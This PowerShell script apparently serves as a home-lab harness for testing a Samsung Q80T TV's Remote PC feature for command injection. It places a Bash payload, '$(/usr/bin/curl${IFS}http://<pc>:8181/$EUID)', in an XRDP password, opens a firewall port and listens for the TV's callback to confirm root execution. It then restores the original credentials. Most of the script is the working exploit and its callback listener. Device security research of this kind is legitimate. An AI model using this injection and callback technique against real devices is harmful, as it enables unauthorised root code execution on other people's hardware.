# Owner-controlled Q80T, volatile effective-UID callback via Remote PC.
# Only rotates the dedicated Windows SMB / Docker XRDP lab passwords.
[CmdletBinding()]
param([Parameter(Mandatory=$true)][ValidateSet('Prepare','Listen','Restore')][string]$Action)
$ErrorActionPreference = 'Stop'
$root = (Resolve-Path (Join-Path $PSScriptRoot '..\..')).Path
$dir = Join-Path $root '.local\tiz0wn-lab'
$envFile = Join-Path $dir 'lab.env'
$backup = Join-Path $dir 'lab.env.before-uid'
$ownerFile = Join-Path $dir 'ownership.json'
$compose = Join-Path $PSScriptRoot 'lab\compose.yml'
$fwName = 'DansTVProbe-Temporary-UID-HTTP'
$port = 8181
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Run in Administrator PowerShell.'
}
if (-not (Test-Path $ownerFile)) { throw 'Existing lab ownership marker missing.' }
$owner = Get-Content -LiteralPath $ownerFile -Raw | ConvertFrom-Json
$tvIP = [string]$owner.tv
$pcIP = [string]$owner.pc
if ($owner.user -ne 'danstvprobe' -or $owner.share -ne 'DansTVProbe' -or
    $tvIP -ne '192.168.50.169' -or -not $pcIP.StartsWith('192.168.50.')) {
    throw 'Unexpected lab target. Refusing to change account credentials.'
}
if (-not (Get-LocalUser -Name 'danstvprobe' -ErrorAction SilentlyContinue) -or
    -not (Get-SmbShare -Name 'DansTVProbe' -ErrorAction SilentlyContinue)) {
    throw 'Temporary lab account or SMB share missing.'
}
function Read-Password([string]$file) {
    $hits = @(Get-Content -LiteralPath $file |
        Where-Object { $_.StartsWith('TVPROBE_PASSWORD=') })
    if ($hits.Count -ne 1) { throw ('Expected one password entry in ' + $file) }
    return $hits[0].Substring('TVPROBE_PASSWORD='.Length)
}
function Rotate([string]$password) {
    if (-not (Test-Path $envFile)) { throw 'Lab credentials file missing.' }
    $lines = @(Get-Content -LiteralPath $envFile)
    $out = @()
    $found = 0
    foreach ($line in $lines) {
        if ($line.StartsWith('TVPROBE_PASSWORD=')) {
            $found++
            $out += ('TVPROBE_PASSWORD=' + $password)
        } else { $out += $line }
    }
    if ($found -ne 1) { throw 'Expected exactly one password entry.' }
    Set-LocalUser -Name 'danstvprobe' -Password (ConvertTo-SecureString $password -AsPlainText -Force)
    $out | Set-Content -LiteralPath $envFile -Encoding ASCII
    & docker compose --env-file $envFile -f $compose up -d --force-recreate --no-build
    if ($LASTEXITCODE -ne 0) { throw 'Recreating XRDP container failed.' }
}
switch ($Action) {
    'Prepare' {
        if (-not (Test-Path $envFile)) { throw 'Lab env missing.' }
        if (Test-Path $backup) { throw 'Probe already prepared. Restore first.' }
        if (Get-NetFirewallRule -Name $fwName -ErrorAction SilentlyContinue) {
            throw 'UID firewall rule already exists.'
        }
        if (Get-NetTCPConnection -State Listen -LocalPort $port -ErrorAction SilentlyContinue) {
            throw 'HTTP callback port 8181 already in use.'
        }
        # Build from fragments so PowerShell stores the exact Bash expansion.
        # This is ~60 characters, shorter than the measured 160-byte input limit.
        $probe = '$(/usr/bin/curl$' + '{IFS}http://' + $pcIP + ':8181/$EUID)'
        if ($probe.Length -gt 160) { throw 'Probe too long.' }
        $original = Read-Password $envFile
        Copy-Item -LiteralPath $envFile -Destination $backup -ErrorAction Stop
        try {
            Rotate $probe
            New-NetFirewallRule -Name $fwName -DisplayName 'DansTV temporary UID HTTP callback' -Direction Inbound -Action Allow -Protocol TCP -LocalPort $port -RemoteAddress $tvIP -Profile Any | Out-Null
        } catch {
            $msg = $_.Exception.Message
            try { Rotate $original } catch { Write-Warning ('Rollback issue: ' + $_.Exception.Message) }
            Get-NetFirewallRule -Name $fwName -ErrorAction SilentlyContinue |
                Remove-NetFirewallRule -ErrorAction SilentlyContinue
            throw ('Prepare failed: ' + $msg + '. Run -Action Restore.')
        }
        Write-Output ('Lab passwords rotated, XRDP restarted on ' + $pcIP + ':3389.')
        Write-Output 'TEMPORARY TV Remote PC password to enter exactly:'
        Write-Output $probe
        Write-Output 'Remember credentials must be checked. Username stays danstvprobe.'
        Write-Output 'Open another Administrator PowerShell and run -Action Listen.'
        Write-Output 'Reconnect from TV and click Samsung Shared Folder once.'
    }
    'Listen' {
        if (-not (Test-Path $backup)) { throw 'Run -Action Prepare first.' }
        $listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Parse($pcIP),$port)
        $listener.Start()
        Write-Output ('Listening on ' + $pcIP + ':8181 for one TV callback.')
        try {
            $deadline = (Get-Date).AddMinutes(10)
            $received = $false
            while ((Get-Date) -lt $deadline -and -not $received) {
                if (-not $listener.Pending()) { Start-Sleep -Milliseconds 250; continue }
                $client = $listener.AcceptTcpClient()
                try {
                    $remote = ([Net.IPEndPoint]$client.Client.RemoteEndPoint).Address.ToString()
                    $stream = $client.GetStream()
                    $stream.ReadTimeout = 4000
                    $reader = [IO.StreamReader]::new($stream,[Text.Encoding]::ASCII,$false,1024,$true)
                    $request = $reader.ReadLine()
                    $crlf = [string][char]13 + [string][char]10
                    $reply = [Text.Encoding]::ASCII.GetBytes('HTTP/1.1 204 No Content' + $crlf + 'Content-Length: 0' + $crlf + 'Connection: close' + $crlf + $crlf)
                    $stream.Write($reply,0,$reply.Length)
                    if ($remote -eq $tvIP) {
                        $received = $true
                        if ($request -match '^GET /0( |[?])') {
                            Write-Output 'UID0-PROOF: Q80T command substitution executed with effective UID 0.'
                        } elseif ($request -match '^GET /([0-9]+)( |[?])') {
                            Write-Output ('TV-CALLBACK: effective UID ' + $Matches[1] + ' (not root).')
                        } else {
                            Write-Output ('TV-CALLBACK: unexpected path ' + $request)
                        }
                    } else { Write-Output ('Ignored request from ' + $remote) }
                } finally { $client.Close() }
            }
            if (-not $received) { Write-Output 'NO-CALLBACK: Q80T root status unconfirmed.' }
        } finally { $listener.Stop() }
    }
    'Restore' {
        if (-not (Test-Path $backup)) {
            Write-Output 'No original credentials backup to restore.'
            break
        }
        $original = Read-Password $backup
        Rotate $original
        Get-NetFirewallRule -Name $fwName -ErrorAction SilentlyContinue |
            Remove-NetFirewallRule -ErrorAction SilentlyContinue
        Remove-Item -LiteralPath $backup -Force
        Write-Output 'Original lab RDP/SMB credentials restored; UID firewall rule removed.'
        Write-Output 'Update the saved password on the Samsung Remote PC profile.'
    }
}
